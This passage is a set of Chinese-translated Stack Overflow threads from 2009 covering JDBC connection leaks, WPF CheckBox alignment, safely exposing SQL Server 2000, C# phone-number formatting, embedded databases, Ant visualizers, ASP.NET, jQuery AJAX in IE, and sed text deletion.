从长远来看，我认为您会出于性能原因考虑连接池。当你这样做时，我建议你看看[c3p0](http://sourceforge.net/projects/c3p0)。我认为它比 Tomcat 的内置池选项更灵活，而且我通常更喜欢“容器外”解决方案，以便将来切换容器时不那么痛苦。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-10T00:31:35.907

真的很难说，因为你提供的关于实际失败的信息太少了：

> 在几次请求之后，应用程序服务器死掉了，并且在日志文件中我们发现了与数据库连接失败相关的异常。

你能告诉我们：

*   你看到的错误到底是什么
*   给我们一个代码的小例子，您可以在其中连接和服务您的一个请求
*   是在一致数量的事务之后失败，还是看起来是随机的

我已经编写了很多与数据库相关的 java 代码（几乎我所有的代码都是与数据库相关的），并使用了 MS 驱动程序、jdt 驱动程序和来自 jnetDirect 的驱动程序。

我敢肯定，如果您向我们提供更多详细信息，我们可以为您提供帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-11T00:52:49.917

如果您没有关闭 JDBC 连接，那么这是正确的行为。

当您使用完每个 JDBC 资源以及您使用它获得的其他 JDBC 资源时，您必须调用它的 close() 方法。

这适用于 Connection、Statement/PreparedStatement/CallableStatement、ResultSet 等。

如果你没有做到这一点，对于初学者来说，你将在 SQL 服务器上囤积潜在的巨大且可能非常有限的资源。

最终，连接将不会被授予，执行获取查询并返回结果将失败或挂起。

如果您未将 autoCommit 属性设置为 true，则在每个事务结束时未能 commit() 或 rollback() 时，您还可能会注意到 INSERT/UPDATE/DELETE 语句挂起。

我所看到的是，如果您将上面提到的严格应用到您的 JDBC 客户端代码中，那么 JDBC 和您的 SQL 服务器将非常顺利地工作。如果你写废话，那么一切都会像废话一样。

许多人编写 JDBC 调用时期望通过调用 close() 来释放每个东西，因为这很无聊，并且应用程序和服务器在他们忽略它时不会立即失败。

确实如此，但是那些程序员编写了他们的程序来与他们的服务器玩“墙上的 99 瓶啤酒”。

资源将耗尽，请求往往会导致以下一种或多种情况发生：连接请求立即失败，SQL 语句立即失败或永远挂起，或者直到某个可怕的冗长事务超时计时器到期，等等。

因此，解决这些类型的 SQL 问题的最快方法不是责怪 SQL 服务器、应用程序服务器、Web 容器、JDBC 驱动程序，也不能责怪 Java 垃圾收集器中嵌入的令人失望的人工智能。

解决这些问题的最快方法是射杀在您的应用程序中编写 JDBC 调用的人，该调用使用 Nerf dart 与您的 SQL 服务器通信。当他说：“你这样做是为了什么……？！” 只需指向这篇文章并告诉他阅读即可。（切记不要拍他的眼睛、他手里的东西、可能危险/易碎的东西等）

至于连接池解决您的问题......不。抱歉，连接池只是通过将预先分配的、可能是回收的连接交给应用程序来加速获取应用程序中的连接的调用。

牙仙把钱放在你的枕头下，复活节兔子把鸡蛋和糖果放在你的灌木丛下，圣诞老人把礼物放在你的树下。但是，很抱歉打破了您的幻想——SQL 服务器和 JDBC 驱动程序不会关闭所有内容，因为您“忘记”了关闭您自己分配的所有内容。

# wpf - 如何在 ListBoxItem 中居中 WPF CheckBox

> ID：425811
> 
> 赞同：4
> 
> 时间：2009-01-08T20:38:44.183
> 
> 标签：wpf, listbox, checkbox

我有一个使用 ItemContainerStyle 的 ListBox。我已经尝试了所有我能想到的让 CheckBox 控件垂直和水平居中。有任何想法吗？

```
<ListBox
  IsSynchronizedWithCurrentItem="True" 
  Height="Auto" Width="Auto" DockPanel.Dock="Top"
  ItemContainerStyle="{StaticResource lbcStyle}" />

<Style TargetType="ListBoxItem" x:Key="lbcStyle">
    <Style.Triggers>
        <Trigger Property="IsSelected" Value="True">
          <Setter Property="ContentTemplate" Value="{StaticResource editable}"/>
        </Trigger>
    </Style.Triggers>
    <Setter Property="ContentTemplate" Value="{StaticResource nonEditable}"/>
    <Setter Property="HorizontalContentAlignment" Value="Center"/> '//i have tried stretch here also
    <Setter Property="VerticalContentAlignment" Value="Stretch"/>
</Style> 
```

CheckBoxes 得到这种风格：

```
<Style x:Key="editorCheckBox" TargetType="{x:Type CheckBox}">
    <Setter Property="MinWidth" Value="67" />
    <Setter Property="Height" Value="25" />
    <Setter Property="Margin" Value="5,0,5,0" />
    <Setter Property="VerticalAlignment" Value="Center" />
    <Setter Property="HorizontalAlignment" Value="Center" />
</Style> 
```

以下是可编辑/不可编辑的：

```
<DataTemplate x:Key="editable">
              <Border x:Name="brdEditable" Width="Auto" HorizontalAlignment="Stretch">
                <DockPanel x:Name="dpdEditable" LastChildFill="True" Width="Auto" Height="Auto">
                  <Grid x:Name="grdEditable" Width="Auto" Height="Auto">
                    <Grid.ColumnDefinitions>
                      <ColumnDefinition Width="25" />
                      <ColumnDefinition Width="25" />
                      <ColumnDefinition Width="100" />
                      <ColumnDefinition Width="100" />
                      <ColumnDefinition Width="80" />
                      <ColumnDefinition Width="110" />
                      <ColumnDefinition Width="110" />
                      <ColumnDefinition Width="60" />
                      <ColumnDefinition Width="90" />
                    </Grid.ColumnDefinitions>
                    <Grid.RowDefinitions>
                      <RowDefinition></RowDefinition>
                      <RowDefinition></RowDefinition>
                    </Grid.RowDefinitions>
                    '...
                    <CheckBox x:Name="chkActive" Grid.Column="7" Height="25" Style="{StaticResource editorCheckBox}" ToolTip="Is Construction Active?" IsEnabled="true" Validation.ErrorTemplate="{StaticResource validationTemplate}">
                      <CheckBox.IsChecked>
                        <Binding Path="Active">
                          <Binding.ValidationRules>
                            <DataErrorValidationRule></DataErrorValidationRule>
                            <ExceptionValidationRule></ExceptionValidationRule>
                          </Binding.ValidationRules>
                        </Binding>
                      </CheckBox.IsChecked>
                    </CheckBox>
                    '...
                    <ContentControl Name="ExpanderContent" Visibility="Collapsed" Grid.Row="1" Grid.Column="1" Grid.ColumnSpan="14"></ContentControl>
              </Grid>
            </DockPanel>
          </Border>
        </DataTemplate>

 <DataTemplate x:Key="nonEditable">
      <Border x:Name="brdNonEditable" Width="Auto" HorizontalAlignment="Stretch">
        <DockPanel Width="Auto" Height="25">
          <Grid Width="Auto" Height="25">
            <Grid.ColumnDefinitions>
              <ColumnDefinition Width="25" />
              <ColumnDefinition Width="25" />
              <ColumnDefinition Width="100" />
              <ColumnDefinition Width="100" />
              <ColumnDefinition Width="80" />
              <ColumnDefinition Width="110" />
              <ColumnDefinition Width="110" />
              <ColumnDefinition Width="60" />
              <ColumnDefinition Width="90" />
            </Grid.ColumnDefinitions>
            <CheckBox x:Name="chkActive" Grid.Column="7" Height="25" Style="{StaticResource editorCheckBox}" ToolTip="Is Construction Active?" IsEnabled="false" Validation.ErrorTemplate="{StaticResource validationTemplate}">
              <CheckBox.IsChecked>
                <Binding Path="Active">
                  <Binding.ValidationRules>
                    <DataErrorValidationRule></DataErrorValidationRule>
                    <ExceptionValidationRule></ExceptionValidationRule>
                  </Binding.ValidationRules>
                </Binding>
              </CheckBox.IsChecked>
            </CheckBox>
            <Label Content="calCompDate" Style="{StaticResource editorLabelList}" Grid.Column="8" ToolTip="{Binding Path= CompDate}" />
          </Grid>
        </DockPanel>
      </Border>
    </DataTemplate> 
```

非常感谢所有试图帮助我解决这个问题的人！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2010-08-26T09:31:34.567

尝试将`ScrollViewer.HorizontalScrollBarVisibility`属性设置`"Disabled"`为 ListBox 上。这会强制项目容器具有固定宽度；否则，它们可以具有任何水平尺寸，并且无法合理计算水平对齐方式。

根据 Donnelle 的回答，垂直对齐应该是修改 ListBoxItem 样式的问题。

编辑：在您的代码片段中，复选框位于一个网格内，该网格位于一个边框内的 DockPanel 内。您要准确地将哪个元素居中？你确定其他人不干涉吗？这是我的建议和 Horizo​​ntalContentAlignment="Center" 对我的看法，只有数据模板中的复选框：

![替代文字](https://i.stack.imgur.com/0cVTw.png) 再进行一次编辑：我复制/粘贴了您的网格/停靠面板/边框，它们与您粘贴的片段中的显示完全相同，结果*完全相同*- 项目水平居中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T20:44:10.460

我有同样的问题。您是否尝试过直接在样式中的 ListBoxItem 上设置“Horizo​​ntalAlignment”？（不是水平内容对齐）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T21:36:33.880

您是否尝试在 ListBox 本身上将 Horizo​​ntalContentAlignment 设置为“Stretch”？我相信这是使每个 ListBoxItem 填充 ListBox 的宽度所必需的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T20:21:29.887

设置 ListBoxItem 样式的高度——而不是复选框——可以满足我的要求。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-09-20T01:38:30.080

复选框左上角对齐。为了快速而肮脏，我已将复选框上的边距更新为 20 行高的 4,3,0,0。可能需要根据您的行高以及如果您想要左侧的缓冲区进行调整。如果您没有时间编写自己的模板或使用其他控件/容器，margin 属性可以让您摆脱奇怪的格式情况。

# sql-server - 将 SQL Server 2000 安全地暴露在 Internet 上

> ID：425812
> 
> 赞同：3
> 
> 时间：2009-01-08T20:38:51.607
> 
> 标签：sql-server, port, sql-server-2000

我有一个 SQL Server 2000 盒子，我想把它放到“互联网”上，这样开发人员就可以在没有 VPN 访问的情况下进行远程连接。

这样做最安全的方法是什么？它可能是暂时的，例如每隔一段时间，但它绝对是必要的。

谢谢，

抢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T21:10:26.600

简短的回答 - 不要这样做。

长答案：

在盒子上安装好的防火墙。

在其上安装并运行[ssh 服务器](http://sshwindows.sourceforge.net/)。

只打开 ssh 端口。

您的开发人员可以使用[PuTTY](http://www.chiark.greenend.org.uk/~sgtatham/putty/)或任何其他 ssh 客户端通过 ssh 连接[“隧道”](http://realprogrammers.com/how_to/set_up_an_ssh_tunnel_with_putty.html)连接 sql 端口。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:57:57.047

安全的做法是把它放在 VPN 后面。

说真的，你为什么会考虑这样的风险？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T21:28:16.097

阅读 DannySmurf 的回答。如果安全威胁不是您最关心的问题，那么至少尝试一下[LogMeIn 。](https://secure.logmein.com/home.asp?lang=en)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-25T19:05:25.130

第一个选项，我同意，“不要”。

第二个选项，在暴露的盒子上创建一个 Web 前端，让 sql 不暴露。

第三个选项，如果您必须公开 sql 框，则强制对所有客户端进行非对称密钥加密，拒绝所有其他连接，记录客户端并查看连接日志，并针对与允许的连接规范不匹配的客户端发出警报（存储在内部非暴露的服务器）。准备好迎接一些肯定会让你大吃一惊的启发性黑客技术。

-阿莱克

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-25T19:21:21.270

我不小心让一个 SQl 服务器（端口 1433）在网上打开了一段时间，一旦我意识到这一点，我就会通过某种自动化程序（我相信来自 IP 大军）每小时获得大约 100,000 次点击，试图闯入服务器。

幸运的是，我使用了非常长而复杂的密码……而且不要相信我曾经被泄露过。

# c# - 将规范化的电话号码转换为用户友好的版本

> ID：425814
> 
> 赞同：6
> 
> 时间：2009-01-08T20:40:15.567
> 
> 标签：c#, regex, formatting, phone-number

在我的 C# 应用程序中，我使用正则表达式来验证美国电话号码的基本格式，以确保用户不只是输入虚假数据。然后，我去掉除数字之外的所有内容，所以：

> (123) 456-7890 x1234

变成

> 12345678901234

在数据库中。但是，在我的应用程序的各个部分中，我想将此规范化的电话号码转换回

> (123) 456-7890 x1234

做这种事情的最好方法是什么？（顺便说一句，不用担心国际电话号码格式。）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-01-08T20:49:59.590

```
String.Format("{0:(###) ###-#### x ###}", double.Parse("1234567890123")) 
```

将导致 (123) 456-7890 x 123

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-08T20:46:55.227

使用正则表达式，您可以替换：

```
(\d{3})(\d{3})(\d{4})(\d{4}) 
```

和：

```
(\1) \2-\3 x\4 
```

（虽然我不熟悉美国的电话号码，所以也许还有更多。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T20:49:47.217

我只会使用自定义格式字符串将数字转换回字符串：

```
class Program
{
    static void Main(string[] args)
    {
        long phoneNumber = 12345678901234;
        string phoneNumberString = String.Format("{0:(000) 000-0000 x0000}", phoneNumber);
        Console.WriteLine(phoneNumberString);
    }
} 
```

当然，您可以将其分解为一个函数，该函数将电话号码作为一个长字符串，然后返回字符串（将格式加载或存储为方法中的常量，或适合您的情况）。

哦，如果你有一个字符串而不是长字符串，你可以轻松地将字符串转换为长字符串，然后将其传递给格式函数。当然，如果您重复执行此操作，则此处需要考虑性能（因为您正在迭代字符串以创建长字符串，然后将其转换回字符串，而您可以只使用子字符串）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T21:13:53.067

如果您只支持美国数字，您可以简单地格式化数字以在任何您想要的地方显示括号和 x。

我宁愿存储整个字符串，我会使用正则表达式对其进行解析以对其进行验证，然后将其存储在规范化的字符串中。

为了让它接受任何国家，我会这样做：

我会将 IDD 代码添加到所有电话号码，然后对来自该国家/地区的用户隐藏它。

所以： (123) 456-7890 x1234 将被存储为 +1 (123) 456-7890 x1234

（perl 兼容的）正则表达式类似于（完全未经测试且不起作用）：

(+\d+)?\s+(((\d{,3}))(?\s+([-.0-9]{6,})\s+((x|ext\w*)\d{ ,4})

*   这是一个可选的数字，前面有 +
*   后跟一个或多个空格
*   然后是括号之间最多 3 个数字的可选组
*   然后一个或多个空格
*   然后是一组 6 个或更多数字、破折号或圆点
*   然后一个或多个空格
*   然后是一个可选的 x 或一个以 ext (ext, extension ...) 开头的单词和一组最多 4 位数字

我将有一个用户数据库，包括国家和地区代码，然后自动填写以防他们丢失，该国家将有电话号码的默认数字分组约定（美国为 3,4）。

*   所以如果你在美国的123区，输入456.7890，会被解析为+1（123）4567890，你只会看到456-7890
*   如果您在卡塔尔并输入数字 4444555 extenshn 33，则存储为 +974 4444555 x33，您会看到它为 4444555 x33

同一国家的用户不显示国际区号，同一国家和区号的用户不显示区号。完整的数字将显示在鼠标悬停上（HTML 标签？）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T20:48:19.217

你必须为数据库分解它吗？如果没有，不要。如果您必须，那么您可以将不同的部分存储在不同的字段中（区域代码、前缀、订阅者编号、扩展名）。

或者，提取数字并开始解析。如果它只有 10 位数字，那么您就知道没有扩展名。超过 10 的所有数字，将它们粘贴在字符串中的“x”或其他内容之后。

我在一个 C++ 应用程序中做了类似的事情，我将存储的不同联系机制写为一个字符串，但是相反，我做了与你正在做的相反的事情。我从对话框中删除了字段，并构建了格式化的数字以存储为字符串。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-26T00:21:18.817

这是一个可能有帮助的扩展方法：

```
public static string InsertStringAtPositions(this string str, string insertStr, IEnumerable<int> positions)
{
    if (str != null && insertStr != null && positions != null)
    {
        string newString = string.Empty;
        int previousPos = 0;
        foreach (var pos in positions)
        {
            if (pos < str.Length)
            {
                newString += str.Substring(previousPos, pos - previousPos) + insertStr;
                previousPos = pos;
            }
        }
        if (positions.Last() < str.Length)
        {
            return newString + str.Substring(positions.Last(), str.Length - positions.Last());
        }
        return newString;
    }
    return str;
} 
```

用法：

```
// Will convert "0399998888" to "03 9999 8888"
number.InsertStringAtPositions(" ", new[] {2, 6}); 
```

# open-source - 那里有任何开源代码生成项目吗？

> ID：425818
> 
> 赞同：2
> 
> 时间：2009-01-08T20:41:41.867
> 
> 标签：open-source, code-generation

我正在使用一个内部代码生成器，我们在其中提供有关我们对象的所有元数据，它生成我们的数据库和包括验证逻辑的对象模型。一旦我们在数据库中加载了所有数据，我们就使用经典的 ASP <% %> 来构建我们的模板。我想知道有哪些与此类似的开源框架。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-13T17:49:26.510

您还可以查看基于 Eclipse 的 openArchitectureWare ( [http://www.openarchitectureware.org/](http://www.openarchitectureware.org/) )。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T20:52:57.540

你看过我这[一代](http://www.mygenerationsoftware.com/)吗？它不是完全开源的，但它是免费的，并且脚本是完全开放的。最常见的用法是在给定数据库模式的情况下生成数据层，但您可以更有创意。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-08T22:44:46.907

还有[Cog](http://nedbatchelder.com/code/cog/)，它允许您在源文件中运行 Python 脚本。包含的 Cog 模块允许打印到它当前正在处理的文件中。Cog 在 MIT 下获得许可。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T20:48:16.847

查看[Star UML](http://staruml.sourceforge.net/en/)，它是开源的并且具有一些不错的代码生成功能。

我还会研究 Eclipse 插件选项，我确信它们是可用的，我只是没有使用过任何一个。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-10T00:11:47.863

[MyGeneration 代码生成器](http://sourceforge.net/projects/mygeneration/)现在是开源的。

# database - 我的应用程序附带的开源数据库

> ID：425822
> 
> 赞同：2
> 
> 时间：2009-01-08T20:42:19.837
> 
> 标签：database, open-source, embedded-database

我需要可以随我的商业应用程序一起提供的开源数据库。它不应该有任何安装（即没有窗口服务和设置）。

它可以是单用户数据库。它应该在 Windows 环境中工作并从 Java 代码中使用。

谢谢

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-01-08T20:45:02.657

我真的很喜欢[SQLite](http://www.sqlite.org/)。您可以通过[SQLiteJDBC](http://www.zentus.com/sqlitejdbc/)将它与 java 一起使用。它是非常好的嵌入式数据库。[不过，对于 Java，使用Derby](http://db.apache.org/derby/)可能更容易。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-08T21:20:27.407

您可能还想查看[HSQL](http://hsqldb.org/)和[H2](http://www.h2database.com/html/main.html)，它们都是用 Java 编写的开源嵌入式数据库。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-09T09:22:48.413

[Firebird Embedded](http://www.firebirdsql.org/manual/fbmetasecur-embedded.html) - 只需要几个 DLL 文件，并且您拥有完整的数据库。多年来一直在使用它。 [如何在 Java 中使用它](http://www.firebirdfaq.org/faq350/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T20:44:09.243

查看 SQLite。我没有使用它，但我有声称使用它的应用程序，我无法区分。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T20:44:45.277

[SQLite](http://www.zentus.com/sqlitejdbc/)怎么样？它具有良好的性能，并且只有一个用户，您不必担心并发问题。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-09T09:25:57.020

甲骨文伯克利数据库：[http ://www.oracle.com/database/berkeley-db/index.html](http://www.oracle.com/database/berkeley-db/index.html)

# java - 有没有好的蚂蚁可视化程序？

> ID：425842
> 
> 赞同：3
> 
> 时间：2009-01-08T20:45:35.760
> 
> 标签：java, ant, utility

我正在寻找一个实用程序，它将吸收一个 ant 构建文件并呈现该目标可用的目标和属性的图形显示。请不要回复“VisualAnt”我拥有它，它很烂。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-19T19:00:40.377

我使用 yWorks Ant Explorer。它作为一个独立的应用程序运行。这个很不错。显然也有一个 Eclipse 插件，但我无法找到它。

免费。不确定 yWorks 是否还在开发它。[您可以在此处](http://myblog.chaiware.org/2009/02/ant-explorer-graphical-ant-build-tool.html)和[此处](http://webscripts.softpedia.com/script/Development-Scripts-js/yWorks-Ant-Explorer-29247.html)下载 jar 。下载后，只需使用以下命令创建一个 bat 文件：

java -jar antexplorer.jar

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:51:31.253

查看[Ant Style](http://wiki.apache.org/ant/TheElementsOfAntStyle) wiki 页面的元素。他们在那里有一个 XSLT 样式表的链接，使构建文件可浏览。[这](http://www.ibm.com/developerworks/xml/library/x-antxsl/examples/example2/ant2html.xsl)是它的链接。wiki 页面还显示了如何使用它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T23:14:41.137

Linguine Maps 可能是一种选择。

请参阅[创建实体关系图文本](http://www.rgagnon.com/javadetails/java-0584.html)

再见。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2011-10-04T12:41:29.970

如果您是 Eclipse 用户，请查看[Ant Visualization Plugin for Eclipse](https://bitbucket.org/satyagraha.1956/ant_vis/wiki/Home)

# asp.net - 谈 ASP.NET

> ID：425845
> 
> 赞同：2
> 
> 时间：2009-01-08T20:45:53.717
> 
> 标签：asp.net

我公司的一个朋友正在考虑使用 Java 或 ASP.NET 进行 Web 开发。目前他们在 Delphi 中进行所有开发。由于他们没有 .NET 方面的经验，所以他们要求我下来给 1 小时的 .NET 概述（主要是 ASP.NET）。我应该涵盖哪些主题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-08T21:09:57.817

我被一家 Delphi 产品公司聘为高级 .NET 开发人员，目标是将他们的应用程序从 Delphi 客户端服务器/桌面应用程序迁移到基于 Web 的 ASP.NET。

我不再在那里工作，但仍然与仍然在那里的经验丰富的 Delphi 程序员保持朋友关系。

您最关心的是确保这些 Delphi 程序员开始了解从桌面客户端服务器应用程序（使用 Delphi 很常见）到基于 Web 的无状态、跨浏览器 UI ASP.NET 的根本转变。

我上一家公司的朋友说，公司在 2 年后仍然在苦苦挣扎，.NET 的进展很小。XML、Javascript、AJax 等技术，甚至 .NET CLR 和程序集等基础知识对团队来说仍然有点神秘。

总之，如果我是你，我会完全专注于更大的概念，例如 Web 的无状态特性以及 ASP.NET 如何解决它，以及瘦客户端软件的优缺点（即易于部署、浏览器不兼容、不太丰富的用户界面等）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T20:51:35.420

有很多东西要覆盖！

虽然 ASP.Net 更适合 Web 开发，但它是为它设计的。考虑以下特点：

*   会员提供者
*   ASP.Net 控件
*   整个页面和代码隐藏系统，不要忘记 ASP.Net MVC
*   ASP.Net Ajax 和对 jQuery 的支持
*   ASP.Net 一般表现良好，但不确定 Java
*   使用 .Net 库和语言、C# 或 VB.Net 等。
*   许多许多更多

我将介绍这些，ASP.Net 被设计为比 Java 更完整的 Web 开发包的方式。我还认为 ASP.Net 中的页面和代码之间的连接比使用 PHP/Java 或他们如何做到这一点更好。

也可以相对容易地切换到 Winforms 或其他 MS 技术。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T20:52:31.440

除了您无疑会得到的其他建议之外，我会向他们解释，有一个适用于 .NET 的 Delphi 可以稍微减轻更改带来的痛苦。所以基本上他们使用 Delphi 作为语言，但作为 .NET 的基础。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T20:56:50.747

您可能想与您的区域开发人员传道员交谈。我敢肯定，对于这样的实例，他们有一堆要点。

您可以在以下网址找到您当地的布道者：http: [//msdn.microsoft.com/en-us/bb905078.aspx](http://msdn.microsoft.com/en-us/bb905078.aspx)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T21:06:32.253

如果他们确实想探索 C#，过渡非常容易。只需提醒他们 Anders Hejlsberg 是 Delphi 和 C# 的首席架构师。
[http://en.wikipedia.org/wiki/Anders_Hejlsberg](http://en.wikipedia.org/wiki/Anders_Hejlsberg)

我是 VB.net 的人，但几年前我参加了一年的 Delphi 演出。当我回到 .Net 时，我使用的是 C#，而且过渡非常容易。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-08T21:01:16.040

不确定您是否打算提供更多的架构视图或更多的实践经验（例如，构建一个演示 Hello World ASP.NET 站点），但无论如何，这里有一些主题可能会让他们感兴趣：

*   .NET 涵盖多种语言（C#、VB.NET、IronPython、IronRuby、Delphi.NET），即使在同一个解决方案上；这意味着开发人员可以重用他们以前的一些知识；
*   为了支持上述项目，CLR、IL 等的概述可能会很有用，也许可以将其与 Java 的工作方式进行比较
*   Visual Studio.NET 是一个很棒的 IDE，有很多支持最新最佳实践（TDD、IoC 等）的工具，包括 OSS
*   如果你的队友对 MVC 和 RoR 的含义有所了解，不妨提一下 Mono（也许向他们展示在 Windows、MAC 和 Linux 上运行的相同应用程序？）和 ASP.NET MVC

我会再想一些... :)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T21:30:25.780

首先，我将向他们介绍如何使用 Visual Studio 以及 Java 中的任何等价物创建一个简单的 Web 应用程序。看到它完成的意义不仅仅在于给出理论。

# json - jQuery AJAX 请求在 IE 中失败

> ID：425854
> 
> 赞同：38
> 
> 时间：2009-01-08T20:47:51.153
> 
> 标签：json, internet-explorer, jquery

以下 AJAX 调用在 IE 中失败。

```
$.ajax({
    url:"{{SITE_URL}}/content/twitter.json",
    dataType:"json",
    error:function(xhr, status, errorThrown) {
        alert(errorThrown+'\n'+status+'\n'+xhr.statusText);
    },
    success:function(json) {
               ...Snip...
    }
}); 
```

错误函数返回

```
Undefined
parsererror
OK 
```

没有向服务器发出请求，所以我认为 JSON 没有问题。

**已修复，请参阅 #1351389**

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2009-08-29T13:02:25.157

已修复，我将 content-type 从更改为`application/json; charset=utf8`plain `application/json`。
我讨厌 IE :)

也为了避免 IE 超级缓存试试这个：

```
var d = new Date();
$.ajax({
        url:"{{SITE_URL}}/content/twitter.json?_="+d.getTime(), 
...Snip... 
```

这样，每个请求都是 IE 获取的新 url：D

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2009-01-08T23:50:02.503

对于缓存问题，为什么不简单地使用`cache: false`参数？

```
$.ajax({ 
    url: "yoururl",
    cache: false,
    .... 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-01-08T21:21:33.380

这是复制/粘贴吗？一直让我感动的一件事是将最后一个“，”留在对象构造函数中。也就是说，大多数浏览器 JS 都接受：

```
o = { a:1, b:2, c:3, }; 
```

但 IE 对此感到窒息，因为最后一项之后的逗号。将其更改为：

```
o = { a:1, b:2, c:3 }; 
```

它有效。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2013-03-26T14:39:32.307

**在较新版本的 Internet Explorer (IE7) 中，有必要在调用$.ajax**之前编写下一行，否则它永远不会调用该函数：

```
$.ajaxSetup({ cache: false }); //this line before $.ajax!!!
$.ajax({
    //codes
    //codes
    //codes
}); 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-01-08T21:32:51.687

IE 非常积极地缓存 AJAX 请求（无论如何，比 Firefox 更多）。如果这不适合您的站点，您需要在响应中适当地设置 Cache-Control 标头。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-08T22:18:41.330

静态生成的 JSON 和 IE 的一个主要问题是前面的“逗号”，例如，这会在 IE 中引发错误：

```
{
    "one":"hello",
    "two":"hi",
 } 
```

注意最后一个逗号。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-08T21:32:38.893

{{SITE_URL}} 块的提供是关于什么的。尝试查看浏览器源代码中的代码。如果 {{SITE _URL}} 块有一个斜杠，这将使请求 url：

```
http://modomain.com//content/twitter.json

```

哪个可以让 IE 出局？

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2010-05-07T15:29:55.277

IE：JSON 未定义错误已解决

[http://funkatron.com/site/comments/safely-parsing-json-in-javascript/](http://funkatron.com/site/comments/safely-parsing-json-in-javascript/)

通过使用 dataType: "json" 并避免解析

# windows - Vista中的sed - 如何删除之间的所有符号？

> ID：425864
> 
> 赞同：2
> 
> 时间：2009-01-08T20:49:15.597
> 
> 标签：windows, sed

我有一个 bat 文件，我应该用它来删除一个文件的一部分并保存到另一个文件中。我需要删除文本“[aaa bbb]”和“[ccc ddd]”之间的所有符号。那就是如果我有文字：

```
[aaa bbb]
1
2
3
[ccc ddd] 
```

我应该有输出：

```
[aaa bbb]
[ccc ddd] 
```

谢谢

**编辑：**我想澄清这个问题。我应该删除marker1和marker2之间的所有符号。Marker1 和 marker2 只是一些单词或文本的一部分，而不是强制性的行。例如我会有：

```
[aaa bbb] [ccc]
1
2
3
4
5
[www yyy] 
```

如果我想删除 [aaa bbb] 和 [www yyy] 之间的文本，我应该有输出：

```
[aaa bbb] 
[www yyy] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T21:04:45.970

查看[此 sed 提示页面上的“在标记 1 和标记 2 之间删除”部分](http://www.cit.gu.edu.au/~anthony/info/shell/sed.hints)

将其应用于您的示例。**clean.sed**：

```
/^\[aaa bbb\]$/,/^\[ccc ddd\]$/{
 /^\[aaa bbb\]$/!{
   /^\[ccc ddd\]$/!d
 }
} 
```

运行使用：

```
sed -f clean.sed inputfile.txt 
```

要“就地”编辑输入文件，请使用 sed 的 -i 选项：

```
sed -i.bak -f clean.sed datafile.txt 
```

在编辑原始文件之前，会保存名为“datafile.txt.bak”的文件的备份副本。

编辑：由于假设标记总是在他们自己的一行上是错误的，这里有一个脚本可以处理一行中间的标记：

```
/\[aaa bbb\]/,/\[ccc ddd\]/{
  s/\[aaa bbb\].*/[aaa bbb]/
  s/.*\[ccc ddd\]/[ccc ddd]/
  /\[aaa bbb\]$/!{
    /^\[ccc ddd\]/!d
  }
} 
```

对于此输入：

```
foo[aaa bbb]1
2
3
4
5[ccc ddd]bar
foo
[aaa bbb]
1
2
3
[ccc ddd]
bar 
```

它产生：

```
foo[aaa bbb]
[ccc ddd]bar
foo
[aaa bbb]
[ccc ddd]
bar 
```

**笔记！**它**无法**处理标记可以出现在同一行的文件。

**再次编辑：**如果标记 1 的输入格式是这样的，你总是可以指望它在自己的一行上，你可以简化一些脚本：

```
/^\[aaa bbb\]$/,/\[ccc ddd\]/{
  s/.*\[ccc ddd\]/[ccc ddd]/
  /^\[aaa bbb\]$/!{
    /^\[ccc ddd\]/!d
  }
} 
```

（将标记 1 锚定在一行的开头和结尾，并跳过标记 1 行的修剪。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T21:24:17.257

